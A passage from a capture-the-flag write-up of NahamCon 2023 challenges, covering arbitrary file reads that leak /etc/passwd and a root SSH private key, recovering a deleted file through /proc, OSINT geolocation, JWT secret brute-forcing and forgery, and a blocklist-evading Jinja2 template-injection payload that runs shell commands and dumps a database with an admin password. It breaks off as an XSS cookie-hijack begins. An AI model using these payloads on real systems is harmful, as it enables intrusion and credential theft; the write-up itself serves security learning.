‘shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown’ date: invalid date ‘halt:x:7:0:halt:/sbin:/sbin/halt’ date: invalid date ‘mail:x:8:12:mail:/var/mail:/sbin/nologin’ date: invalid date ‘news:x:9:13:news:/usr/lib/news:/sbin/nologin’ date: invalid date ‘uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin’ date: invalid date ‘operator:x:11:0:operator:/root:/sbin/nologin’ date: invalid date ‘man:x:13:15:man:/usr/man:/sbin/nologin’ date: invalid date ‘postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin’ date: invalid date ‘cron:x:16:16:cron:/var/spool/cron:/sbin/nologin’ date: invalid date ‘ftp:x:21:21::/var/lib/ftp:/sbin/nologin’ date: invalid date ‘sshd:x:22:22:sshd:/dev/null:/sbin/nologin’ date: invalid date ‘at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin’ date: invalid date ‘squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin’ date: invalid date ‘xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin’ date: invalid date ‘games:x:35:35:games:/usr/games:/sbin/nologin’ date: invalid date ‘cyrus:x:85:12::/usr/cyrus:/sbin/nologin’ date: invalid date ‘vpopmail:x:89:89::/var/vpopmail:/sbin/nologin’ date: invalid date ‘ntp:x:123:123:NTP:/var/empty:/sbin/nologin’ date: invalid date ‘smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin’ date: invalid date ‘guest:x:405:100:guest:/dev/null:/sbin/nologin’ date: invalid date ‘nobody:x:65534:65534:nobody:/:/sbin/nologin’ date: invalid date ‘user:x:1000:1000:Linux User,,,:/home/user:/home/user/.user-entrypoint.sh’ Sorry, that wasn\u0026#39;t correct! With arbitrary read, we should be able to display the contents of the flag.txt as well!\n1 2 3 4 5 Please select the date you meant: You\u0026#39;ve entered \u0026#39;-f /root/flag.txt\u0026#39;. Is that right? date: invalid date ‘[ Sorry, your flag will be displayed once you have code execution as root ]’ Sorry, that wasn\u0026#39;t correct! Unexpectedly, it looks like flag.txt was a bait after all. It says we must have code execution as root for the flag, but I thought perhaps I can \u0026ldquo;guess\u0026rdquo; the name of the flag file using wildcards:\n1 2 3 4 5 6 7 8 Please select the date you meant: You\u0026#39;ve entered \u0026#39;-f /root/*\u0026#39;. Is that right? date: the argument ‘/root/get_flag_random_suffix_345674837560870345’ lacks a leading \u0026#39;+\u0026#39;; when using an option to specify date(s), any non-option argument must be a format string beginning with \u0026#39;+\u0026#39; Try \u0026#39;date --help\u0026#39; for more information. Sorry, that wasn\u0026#39;t correct! We find an interesting file name. Once more, using exactly this name:\n1 2 3 4 5 6 7 8 Wed Jan 1 00:00:00 UTC 2020 Please select the date you meant: You\u0026#39;ve entered \u0026#39;-f /root/get_flag_random_suffix_345674837560870345\u0026#39;. Is that right? date: invalid date ‘\\177ELF\\002\\001\\001’ date: invalid date ‘:’ date: invalid date ‘.\\001?\\031\\003\\016:\\v;\\v9\\vI\\023\u0026lt;\\031\\001\\023’ Sorry, that wasn\u0026#39;t correct! This is a binary executable, likely containing our flag once we execute as root. So, clearly, we do indeed need code execution as root.\nEventually, I thought to look for ssh keys in /root/.ssh/id_rsa:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 date: invalid date ‘-----BEGIN OPENSSH PRIVATE KEY-----’ date: invalid date ‘b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn’ date: invalid date ‘NhAAAAAwEAAQAAAYEAxllMaPu/ewDglK/+qcskWbUTSiQtLBBX4Ls5EGWmGbTdKh7K7trC’ date: invalid date ‘Nht9hbSx8Ei4cLQWhbbwcvIqDAgrXYO9Vb/sr/BEyk1aVVTpFfLuFbsyZNZTqmONajdsf9’ date: invalid date ‘Kl/4Qy9u8/3duhBYaeV0Am4tK9mzM8/D2YbzmYD+pK8GFwJDQG5RdFstj6NxXjROAsaj8H’ date: invalid date ‘U7HHvkNFctEMMBmquAaG85DZO83ZUWWASB702UNrc701Mhdf7Ln92D2aEhwMisdBjK/F83’ date: invalid date ‘K71YIcrpkuDTQYhms4SGUlYIlUaIhridKH3m3BgCNhC5mjsy5IkV0VwG/SRxew0adhHxT+’ date: invalid date ‘Gc9izi2yy1uW1wrJT0u8ImQhTm35R+cLD+SpWJSHswDxygCVHTUvVIngNakJvWXRKDmS3N’ date: invalid date ‘PjIu9gaJ3D69Q3BDlxcbluhjl2Z/5nenryUZdoVORnCf75YiWgTtI/FhS7HnHyw69LaJoH’ date: invalid date ‘1NPGh/mV730OsnqtdakxkHXd3CDhcwY5QjvJlFEdAAAFgAlNDvEJTQ7xAAAAB3NzaC1yc2’ date: invalid date ‘EAAAGBAMZZTGj7v3sA4JSv/qnLJFm1E0okLSwQV+C7ORBlphm03Soeyu7awjYbfYW0sfBI’ date: invalid date ‘uHC0FoW28HLyKgwIK12DvVW/7K/wRMpNWlVU6RXy7hW7MmTWU6pjjWo3bH/Spf+EMvbvP9’ date: invalid date ‘3boQWGnldAJuLSvZszPPw9mG85mA/qSvBhcCQ0BuUXRbLY+jcV40TgLGo/B1Oxx75DRXLR’ date: invalid date ‘DDAZqrgGhvOQ2TvN2VFlgEge9NlDa3O9NTIXX+y5/dg9mhIcDIrHQYyvxfNyu9WCHK6ZLg’ date: invalid date ‘00GIZrOEhlJWCJVGiIa4nSh95twYAjYQuZo7MuSJFdFcBv0kcXsNGnYR8U/hnPYs4tsstb’ date: invalid date ‘ltcKyU9LvCJkIU5t+UfnCw/kqViUh7MA8coAlR01L1SJ4DWpCb1l0Sg5ktzT4yLvYGidw+’ date: invalid date ‘vUNwQ5cXG5boY5dmf+Z3p68lGXaFTkZwn++WIloE7SPxYUux5x8sOvS2iaB9TTxof5le99’ date: invalid date ‘DrJ6rXWpMZB13dwg4XMGOUI7yZRRHQAAAAMBAAEAAAGAECAzdPeUCOaN264hU2Gcz3RIIL’ date: invalid date ‘InQAVbd6hmX8hmhCwvAkfQR4dehx1ItmWgmoChtNFXYWtO9NwZAghp/3zV7aegZmoaKvkL’ date: invalid date ‘UT5e2DYmGCXeLNI7VBzVjZ9QQWYkBng+LShPYMoEjIP2J0bObTN6pH26cBF77VMD42Cw01’ date: invalid date ‘vrTO4z6ffbO/VQW8kk7zUV4f9vfjpJGyqx9enmsURs8PA1lDjLCIXYV2Sb/4EQzAHOCxyv’ date: invalid date ‘Zfv+LwCsvCIUqXNBVnO+N7hg5b/zh7gyvuzHq/vyOTjkNceQa7SZ/egeclWGkkYttUzUr1’ date: invalid date ‘0cveVqXTM2tfJhv8+cobJcmO7IccjsOyL+zYPR3mN/Q1nUvGyAERppXfhwTAZ5ljMRDkv/’ date: invalid date ‘KUy7IJ3Q9FnSVdqkni2u6ErHEer0/TKXAT92LYQXzTczd6hGvh+IADlmOLzU2d0RfkPZZ4’ date: invalid date ‘8GKvZfThN1OSMVpcwJMVeILWP6uz9WnnUAXgLIUriJK7rrsHpH0MNTmfTT9v5VSH3RAAAA’ date: invalid date ‘wB2od8rr4IU8AkpZ/kE9kY5a/INNsvSdUA6sn/5Fwso19fiPz2vYdP9fJMYjShV1wb8UFt’ date: invalid date ‘cajFvnnj2DnClU0imh1eC0fB5+vAmJvx8Qq9NWcmz7aejvZrBdIFbqGYr5krc5KvmizYVC’ date: invalid date ‘+tII4u4s5SFcvcZwmuIsWJQjbXA7VVa8v8Y10YJdeYsl3YpKqJdU0xPkt2Y2IgZxTJ4Dd9’ date: invalid date ‘MKgcPTBdOVuKA8r8ALCth9OV74k1GOEpLbDIY4gFiXbi7crQAAAMEA2Z0ZtNS6bUEq61DF’ date: invalid date ‘6758uI3wIeYe8NoGyxlH/oTGVqy5KfQ9vCochcSx0yov4MSZBY+foE8OAxNvAxBSV+2CnQ’ date: invalid date ‘4OHnZnKa9teSvphUCmnt4Va7CWRzmVmNiKlpMOky2P8Zfv3LdgpwrAbwxBL1HQv/eivXDm’ date: invalid date ‘0BQCxuiaOp5/3nz+K+IvA/cBhsJwS6bWMtAhcfzKfS7/NzgcLTtlVR1Li/vC/r69iDs/xi’ date: invalid date ‘zDGCjuOrjsWhqqIqjhMGZjguTz9Y+FAAAAwQDpVj6g1OSqzZ5Kw805VTcbRRTmiHb00hht’ date: invalid date ‘U4LYw5xV+1iNJ8/BijiIZaT/zXnZbzIzLBnPbzqNLW5sBPJ+eMo5wY5ZNKa/qMd4Rdj6Hx’ date: invalid date ‘pAVbuqv6sYPhj2Xl6R/yJUVRw6OGoIa0SEumrmXzbJTT25o9FgItuKOpRRWd9l4gB8Pa1I’ date: invalid date ‘LLomZzqAmpdZtcMX+ihYPAJL5UBGPkD4CO7JwHm+W36NpAEKhi/Fh6D/U/RPEtwXZEbaWY’ date: invalid date ‘vIJis7FbO7UrkAAAAJa2FsaUBrYWxpAQI=’ date: invalid date ‘-----END OPENSSH PRIVATE KEY-----’ Sorry, that wasn\u0026#39;t correct! Very nicely, the whole key is here. from this point it\u0026rsquo;s a matter of creating the cleaned id_rsa file and using it to ssh as root.\n1 2 3 4 5 6 7 8 9 $ ssh -p 32726 -i id_rsa root@challenge.nahamcon.com root@wordle:~# cd /root root@wordle:~# ls flag.txt get_flag_random_suffix_345674837560870345 root@wordle:~# ./get_flag_random_suffix_345674837560870345 Please press Enter within one second to retrieve the flag. flag{2b9576d1a7a631b8ce12595f80f3aba5} There is even the extra precaution of needing to press Enter after running in order to retrieve the password. They were quite thorough in wanting you to have execution as root.\nflag{2b9576d1a7a631b8ce12595f80f3aba5}\nZombie Author: @JohnHammond#6971\nOh, shoot, I could have sworn there was a flag here. Maybe it\u0026rsquo;s still alive out there?\nLogging in, we see an interesting .user-entrypoint.sh file:\n1 2 3 4 5 6 7 user@zombie:~$ ls -al total 24 drwxr-sr-x 1 user user 4096 Jun 15 22:23 . drwxr-xr-x 1 root root 4096 Jun 14 17:52 .. -rwxr-xr-x 1 user user 3846 Jun 14 17:52 .bashrc -rw-r--r-- 1 user user 17 Jun 14 17:52 .profile -rwxr-xr-x 1 root root 131 Jun 14 17:52 .user-entrypoint.sh the contents:\n1 2 3 4 5 6 7 8 9 user@zombie:~$ cat ~/.user-entrypoint.sh #!/bin/bash nohup tail -f /home/user/flag.txt \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp; # disown rm -f /home/user/flag.txt 2\u0026gt;\u0026amp;1 \u0026gt;/dev/null bash -i This looks like something that might be run upon entry. Just to check we can see our default terminal in /etc/passwd:\n1 2 user@zombie:~$ cat /etc/passwd | grep user user:x:1000:1000:Linux User,,,:/home/user:/home/user/.user-entrypoint.sh Looks like this did indeed run and we can see very clearly the rm function getting rid of the flag. oops. Also notable is the tail -f . The -f flag is a live following, or reading the final lines of the file. We can also see a trailing \u0026amp;, meaning this has been set to background. As for nohup:\n1 2 3 4 5 6 $ nohup BusyBox v1.27.2 (2018-06-06 09:08:44 UTC) multi-call binary. Usage: nohup PROG ARGS Run PROG immune to hangups, with output to a non-tty We can see this prevents accidental closings. This process is likely still running.\n1 2 3 4 5 6 7 8 9 10 user@zombie:~$ ps PID USER TIME COMMAND 1 root 0:00 /usr/sbin/sshd -D -e 7 root 0:00 sshd: user [priv] 9 user 0:00 sshd: user@pts/0 10 user 0:00 {.user-entrypoin} /bin/bash /home/user/.user-entrypoint.sh -c bash 11 user 0:00 tail -f /home/user/flag.txt 13 user 0:00 bash -i 18 user 0:00 bash 25 user 0:00 ps We do indeed see this process still running with a PID 11. My thinking is perhaps we can see the contents by exploring the PID in /proc/\n1 2 3 4 5 6 user@zombie:~$ cd /proc/11/ user@zombie:/proc/11$ ls arch_status clear_refs cpuset fd limits mem net oom_score projid_map setgroups stat task uid_map attr cmdline cwd fdinfo loginuid mountinfo ns oom_score_adj root smaps statm timens_offsets wchan auxv comm environ gid_map map_files mounts numa_maps pagemap schedstat smaps_rollup status timers cgroup coredump_filter exe io maps mountstats oom_adj personality sessionid stack syscall timerslack_ns fd refers to file descriptors, which might contain info from stdin, stdout, etc.\n1 2 3 4 5 6 7 8 9 10 11 user@zombie:/proc/11$ cd fd user@zombie:/proc/11/fd$ ls 0 1 2 3 user@zombie:/proc/11/fd$ ls -al total 0 dr-x------ 2 user user 0 Jun 15 22:42 . dr-xr-xr-x 9 user user 0 Jun 15 22:41 .. lr-x------ 1 user user 64 Jun 15 22:43 0 -\u0026gt; /dev/null l-wx------ 1 user user 64 Jun 15 22:43 1 -\u0026gt; /dev/null l-wx------ 1 user user 64 Jun 15 22:43 2 -\u0026gt; /dev/null lr-x------ 1 user user 64 Jun 15 22:43 3 -\u0026gt; /home/user/flag.txt (deleted) While we do see that it notes flag.txt is deleted. However, perhaps we can still see something, since the program is still in running memory?\n1 2 user@zombie:/proc/11/fd$ cat 3 flag{6387e800943b0b468c2622ff858bf744} And the flag is here. Clearly a simple rm might not be enough to exterminate the file out of existence. However, this situation is probably a little unusual since the tail -f was still running long after the rm command.\nflag{6387e800943b0b468c2622ff858bf744}\nOSINT Chall1 Author: @Gary#4657\nHead over to https://osint.golf and select chall1 under the NahamCon2023 category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nFirst challenge places us on a golf course, at some kind of ceremony/speech. The first object of interest is the large event banner, containing the phrase \u0026ldquo;all Thailand Premier Championship\u0026rdquo;. There is more text, Road to (something), that I was unable to accurately read.\nSearching for all Thailand, we quickly see a webpage for a golf tour org. It seems like the right track. One common word that I found appearing was Singha, which might be matching in our image\u0026rsquo;s banner: \u0026ldquo;Road to Singha (something)\u0026rdquo;. The final word was still not readable for me, but this is enough to go on. Searching the golf tour website, I found all Thailand Premier Championship - Road to Singha Masters located on the media page. Following the link takes us to a video, and right away in the video we are given a location\u0026ndash;Singha Park in Khon Kaen.\nI found the tolerance to be rather strict, so I ended up locating the same exact capture on Google Maps as well.\nFinally with the pinpointed location, we get the flag.\nflag{3e3d01a002db29fec2a5e10ec758b852}\nChall2 Author: @Gary#4657\nHead over to https://osint.golf and select chall2 under the NahamCon2023 category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nNOTE: The integrated compass direction is inconsistent with the actual panorama representation.\nThe second challenge places us on a large boat near a dock, with vehicles on it. Unfortunately, boats very commonly travel internationally, so things such as language/flags on the boat may not give us interesting information. The land appears to have some unusual architecture, so I decided to screencap this region and see what a google image search can give me.\nVery quickly I find a very similar capture, labeling it Napoleon\u0026rsquo;s Elba Hideaway. The article notes that this location is in Portoferraio, Italy.\nOnce again, the pointing at the dock itself is not specific enough. After a bit more trial and error, I find the exact location:\nflag{e54fcc18854f0adfdedf22120c346b3a}\nChall3 Author: @Gary#4657\nHead over to https://osint.golf and select chall3 under the NahamCon2023 category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nWe are now in a park. Notably, there are large buildings on all sides of the park. We must be in not only a major city, but a city with a sizeable space dedicated to a grassy open park. My first inclination is New York City with its quite sizeable Central Park. Checking the terrain map, the Sheep Meadow location is a wide grassy area. I look for a street view and know right away that this is a match. From chall3:\nFrom Sheep Meadow street view:\nOnce again, finding the same view location as the challenge:\nflag{aa1b04ee3ded3a7c3ee16be1ff85e99c}\nChall4 Author: @Gary#4657\nHead over to https://osint.golf and select chall4 under the NahamCon2023 category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nNOTE: The integrated compass direction is inconsistent with the actual panorama representation.\nIn the final Geosint challenge, we are given a drone shot of what seems to be a suburban area setting. We are too far away do identify anything such as the language on signs or country flags, but we can note the very large number of train track lanes. Some buildings in the distance appear to have uncommon architecture, but not enough for me to draw any conclusions. My first guess is to take the most eye-catching building and see what image searches can do for me.\nFrom this image, it was quickly identified as Bratislava Castle of Bratislava, Slovakia. This location does not match geographically, but the building\u0026rsquo;s design and colors match very well. The second building I searched for is the neighboring church-like building.\nThere were several identical matches for seemingly different buildings. However, one in particular mentions a castle with it in combination. this web posting seems to be reviewing it as a bike trail. Examining the geography in a google map search for Schloss Ebenfurth, it instantly became clear that this is the same location as the challenge.\nI was unable to find the same capture on Google Maps, but since this is an arial view, we can get a pretty good idea where it might be without too much trouble.\nflag{2e57cfe16d7e1c5431aa3b99d0e713cb}\nWeb Hidden Figures Author: @JohnHammond#6971\nLook at this fan page I made for the Hidden Figures movie and website! Not everything is what it seems!\nEntering the website we see a pretty well-constructed page promoting Hidden Figures, a pretty popular book/movie. None of the links take us to other pages, so there is little to be explored. Early on, I noticed that folder directory /assets/ is free to view. I thought perhaps there might be something hidden here, or in another commonly used folder type?\nAfter some lengthy enumeration, I found nothing of interest.\nLooking at the page source, I noticed that there are several links with very long url codes:\n1 2 data:image/png;base64,/9j/4AAQSkZJRgABAQEBLAEsAAD/7RqcUGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAFocAVoAAxslRxwCAAACAAAcAngAFVdvbWFuIG9mIE5BU0EgTGFuZ2xleRwCVQAPRGF2aWQgQy4gQm93bWFuHAI3AAgyMDE0MDMyMBwCPAALMDkxNTA2KzAwMDA4QklNBCUAAAAAABBbRWm4H1TKYVo1ObYsy6/POEJJTQQ6AAAAAAESAAAAEAAAAAEAAAAAAAtwcmludE91dHB1dAAAAAUAAAAAUHN0U2Jvb2wBAAAAAEludGVlbnVtAAAAAEludGUAAAAASW1nIAAAAA9wcmludFNpeHRlZW5CaXRib29sAAAAAAtwcmludGVyTmFtZVRFWFQAAAAWAEUAUABTAE8ATgAgAFMAdAB5AGwAdQBzACAAUAByAG8AIAA3ADkAMAAwAAAAAAAPcHJpbnRQcm9vZlNldHVwT2JqYwAAAAwAUAByAG8AbwBmACAAUwBlAHQAdQBwAAAAAAAKcHJvb2ZTZXR1cAAAAAEAAAAAQmx0bmVudW0AAAAMYnVpbHRpblByb29mAAAADHByb29mTW9uaXRvcjhCSU0EOwAAAAACLQAAABAAAAABAAAAAAAScHJpbnRPdXRwdXRPcHRpb25zAAAAFwAAAABDcHRuYm9vbAAAAAAAQ2xicmJvb2wAAAAAAFJnc01ib29sAAAAAABDcm5DYm9vbAAAAAAAQ250Q2Jvb2wAAAAAAExibHNib29sAAAAAABOZ3R2Ym9vbAAAAAAARW1sRGJvb2wAAAAAAEludHJib29sAAAAAABCY2tnT2JqYwAAAAEAAAAAAABSR0JDAAAAAwAAAABSZCAgZG91YkBv4AAAAAAAAAAAAEdybiBkb3ViQG/gAAAAAAAAAAAAQmwgIGRvdWJAb+AAAAAAAAAAAA \u0026lt;...SNIP...\u0026gt; And so on. I didn\u0026rsquo;t know this was possible or ever really done, but it appears that some websites might provide their images in base64 encoded data like this so that images can be loaded without retrieving data from other pages. This seems to be what is going on here, as following the link takes me to an image regardless of the website\u0026rsquo;s running state.\nEventually I thought to download each of the images located on the website. While reviewing this challenge I discovered that saving the image directly is enough, but at the time I had decided to copy/paste the entire url into a file. After removing data:image/png;base64, I base64 decoded the info:\n1 $ cat url | base64 -d \u0026gt; decode_url And so on, for all 4 images found.\nChecking exiftool didn\u0026rsquo;t give me any critical information, however binwalk did show me something hidden in the figures.\n1 2 3 4 5 6 7 $ binwalk decode_url2 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 15486 0x3C7E PNG image, 1851 x 174, 8-bit/color RGB, non-interlaced 15527 0x3CA7 Zlib compressed data, default compression There is another image hidden here, and potentially some compressed data? Extracting with binwalk:\n1 2 3 4 5 6 7 $ binwalk -D=\u0026#34;.*\u0026#34; decode_url2 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 15486 0x3C7E PNG image, 1851 x 174, 8-bit/color RGB, non-interlaced 15527 0x3CA7 Zlib compressed data, default compression Viewing the hidden PNG image:\nflag{e62630124508ddb3952843f183843343}\nMarmalade 5 Author: @congon4tor#2334\nEnjoy some of our delicious home made marmalade!\nWe are prompted to choose a username to log in. No password asked. Firstly trying admin, of course we are not allowed. So I go with my old friend asdf.\nOn login, it tells us that only admin can see the flag:\nWith how little content is on these pages, there is pretty much nothing else to consider other than editing the given cookie: token=eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ.SKkdg9_2EbXj67FcZNnXIg Based on the cookie having 3 sections separated by dots, I immediately recognize this as a JWT. Using jwt.io to decode:\nThe blue segment is a signature hashed with a secret key to prevent forgery, but this is not always used to verify. Perhaps we can just edit the Payload section so that our username is admin?\n1 2 3 { \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34; } Converting back to base64, our new token looks like this eyJhbGciOiJNRDVfSE1BQyJ9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ.SKkdg9_2EbXj67FcZNnXIg\nWhen I edit the cookie, it gives me an interesting new error:\n1 2 3 # Bad Request Invalid signature, we only accept tokens signed with our MD5_HMAC algorithm using the secret fsrwjcfszeg***** So while they are checking the token signatures, they did a bit of an oopsie and gave away most of their secret key!! Only the last 5 characters are hidden, making this secret key effectively 5 characters in length. This is something that can be brute-forced rather easily.\nI used python to quickly generate a wordlist containing the known secret string, then appended all possible 5 letter combinations:\n1 2 3 4 5 6 7 8 9 10 fp = open(\u0026#34;wordlist.txt\u0026#34;, \u0026#34;w\u0026#34;) for i in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): for j in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): for k in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): for l in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): for m in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): fp.write(\u0026#39;fsrwjcfszeg\u0026#39; + chr(i) + chr(j) + chr(k) + chr(l) + chr(m) + \u0026#34;\\n\u0026#34;); fp.close() From this point, I can use my previously valid JWT for asdf, and use John the Ripper to brute force the secret key. John will accept the token when the signature is presented in hex, however I had trouble converting myself for some reason. This issue was resolved once I used Sjord\u0026rsquo;s jwtcrack code to recreate my token.\n1 2 $ python convert.py \u0026#39;eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ.SKkdg9_2EbXj67FcZNnXIg\u0026#39; eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ#48a91d83dff611b5e3ebb15c64d9d722 Cracking the secret with john:\n1 2 3 4 5 6 7 8 9 10 $ john jwt.txt --wordlist=wordlist.txt --format=HMAC-MD5 Using default input encoding: UTF-8 Loaded 1 password hash (HMAC-MD5 [password is key, MD5 256/256 AVX2 8x3]) Warning: poor OpenMP scalability for this hash type, consider --fork=2 Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status fsrwjcfszegvsyfa (?) 1g 0:00:00:04 DONE (2023-06-16 13:39) 0.2487g/s 2472Kp/s 2472Kc/s 2472KC/s fsrwjcfszegvsxlg..fsrwjcfszegvtppv Use the \u0026#34;--show --format=HMAC-MD5\u0026#34; options to display all of the cracked passwords reliably Session completed. The secret key is fsrwjcfszegvsyfa Now to generate a valid signature for our forged jwt. Using the first 2 base64 encoded segments, we perform HMAC-MD5 hashing, then convert from hex back to base64:\nFinalized token:\n1 eyJhbGciOiJNRDVfSE1BQyJ9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ.kpCxx3dVioNEfybFE2UBxg Upon refreshing the page, we get the flag.\nflag{a249dff54655158c25ddd3584e295c3b}\nObligatory Author: @congon4tor#2334\nEvery Capture the Flag competition has to have an obligatory to-do list application, right???\nFirstly, we are greeted with a sign-in page\nTypical admin:admin guesses do not work, so after making a new account\nI created a new task asdf, and this is the result. After exploring the POST parameters done during submission, as well as how things are altered when tasks are moved between active and completed, I did not see any interesting pattern. The most notable piece is that trashing my first task leads to http://challenge.nahamcon.com:32053/delete?id=2. However, id=1 appears inaccessible.\nWhen I turned my attention to the greentext, I noticed in the url we see this as well: http://challenge.nahamcon.com:32053/?success=Task%20created Editing the success= component will affect what is being displayed in green. After playing for a bit, I noticed that this is actually vulnerable to SSTI: http://challenge.nahamcon.com:32053/?success={{7*7}}\nDoing actions such as curl -v did not give any insight on the framework being used, but exploring the SSTI a little further gave me the impression that this is likely Jinja2: `http://challenge.nahamcon.com:32053/?success={{7*\u0026lsquo;7\u0026rsquo;}}``\nKnowing this, I tried some simple enumerations before I find the true difficulty of this challenge: http://challenge.nahamcon.com:32053/?success={{config}}\n1 2 HACKER DETECTED!!!! The folowing are not allowed: [ {{\\s*config\\s*}},.*class.*,.*mro.*,.*import.*,.*builtins.*,.*popen.*,.*system.*,.*eval.*,.*exec.*,.*\\..*,.*\\[.*,.*\\].*,.*\\_\\_.* ] It wasn\u0026rsquo;t obvious to me at first, but the real trouble is that any command containing a dot, or square brackets, is blocked. After spending a good amount of time looking for ways to bypass the filter, I eventually ran into this post. Importantly, the writer manages to create a payload to bypass \u0026ldquo;.\u0026rdquo;,\u0026quot;_\u0026quot;, \u0026ldquo;[]\u0026rdquo;, and even \u0026ldquo;|join\u0026rdquo;.\n1 {{request|attr(\u0026#39;application\u0026#39;)|attr(\u0026#39;\\x5f\\x5fglobals\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;)(\u0026#39;os\u0026#39;)|attr(\u0026#39;popen\u0026#39;)(\u0026#39;id\u0026#39;)|attr(\u0026#39;read\u0026#39;)()}} Our blacklist also includes some functions that were used, which I bypassed by breaking between quotes (popen -\u0026gt; po\u0026rsquo;\u0026lsquo;pen).\n1 http://challenge.nahamcon.com:32053/?success={{request|attr(%27application%27)|attr(%27\\x5f\\x5fglobals\\x5f\\x5f%27)|attr(%27\\x5f\\x5fgetitem\\x5f\\x5f%27)(%27\\x5f\\x5fbuil%27%27tins\\x5f\\x5f%27)|attr(%27\\x5f\\x5fgetitem\\x5f\\x5f%27)(%27\\x5f\\x5fimp%27%27ort\\x5f\\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27id%27)|attr(%27read%27)()}} We have successful code execution!! Now all that remains is to find the flag.\nAfter some enumeration of where the flag might be, I began to think that perhaps there isn\u0026rsquo;t a flag.txt file after all. When I check the contents of the cwd:\n1 2 3 4 5 6 7 8 drwxr-xr-x 1 root root 4096 Jun 14 17:54 . drwxr-xr-x 1 root root 4096 Jun 14 17:54 .. drwxr-xr-x 1 uwsgi uwsgi 4096 Jun 16 20:55 DB -rw-r--r-- 1 root root 159 Jun 14 17:53 app.ini -rwxr-xr-x 1 root root 6693 Jun 14 17:53 app.py -rw-r--r-- 1 root root 792 Jun 14 17:53 models.py -rw-r--r-- 1 root root 138 Jun 14 17:53 requirements.txt drwxr-xr-x 2 root root 4096 Jun 14 17:53 templates I notice the DB folder, and I recall that my task id\u0026rsquo;s started at 2. Perhaps the flag is in admin\u0026rsquo;s task list, for id number 1?\nLooking inside the DB folder:\n1 2 3 drwxr-xr-x 1 uwsgi uwsgi 4096 Jun 16 20:55 . drwxr-xr-x 1 root root 4096 Jun 14 17:54 .. -rw-r--r-- 1 uwsgi uwsgi 16384 Jun 16 20:55 db.sqlite Unfortunately, opening a sqlite file is a bit tricky with the RCE that I am currently using. Moreover, dots are still blacklisted. It is fortunate that this folder only has one file, so we can use wildcard * to select db.sqlite without using dot. When I try cat /usr/src/app/DB/*:\nIt seems there are issues when trying to output invalid characters, causing the internal server error. As a last attempt, I decided to try strings, which should only output legitimate utf-8 friendly characters. However, it is not guaranteed that the flag could remain intact for this.\nRequest:\n1 view-source:http://challenge.nahamcon.com:32053/?success={{request|attr(%27application%27)|attr(%27\\x5f\\x5fglobals\\x5f\\x5f%27)|attr(%27\\x5f\\x5fgetitem\\x5f\\x5f%27)(%27\\x5f\\x5fbuil%27%27tins\\x5f\\x5f%27)|attr(%27\\x5f\\x5fgetitem\\x5f\\x5f%27)(%27\\x5f\\x5fimp%27%27ort\\x5f\\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27strings%20/usr/src/app/DB/db*%27)|attr(%27read%27)()}} Output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 tabletasktask CREATE TABLE task ( id INTEGER NOT NULL, name VARCHAR(100), completed BOOLEAN, user_id INTEGER, PRIMARY KEY (id), CHECK (completed IN (0, 1)), FOREIGN KEY(user_id) REFERENCES user (id) tableuseruser CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(40), password VARCHAR(50), PRIMARY KEY (id), UNIQUE (username) indexsqlite_autoindex_user_1user asdfasdf -adminT2dUL6Z#S9KH%x%i asdf admin asdf flag{7b5b91c60796488148ddf3b227735979} Very foturnately, the flag not only survived but is very readable! flag{7b5b91c60796488148ddf3b227735979}\nAs a side note, we have the password for admin now too, and can log in. admin:T2dUL6Z#S9KH%x%i\nStar Wars Author: @congon4tor#2334\nIf you love Star Wars as much as I do you need to check out this blog!\nFirstly comes logging in. After trying and failing a few easy guesses like admin:admin, I made my own account with username asdf. Upon entering we are led to a blog post:\nWe see a comment section and not much else, so of course we have to check for XSS\n1 \u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;);\u0026lt;/script\u0026gt; Our XSS was a hit, but also we can see notice that an admin should review our comment. This setup seems prime for a cookie hijack through XSS. I will use 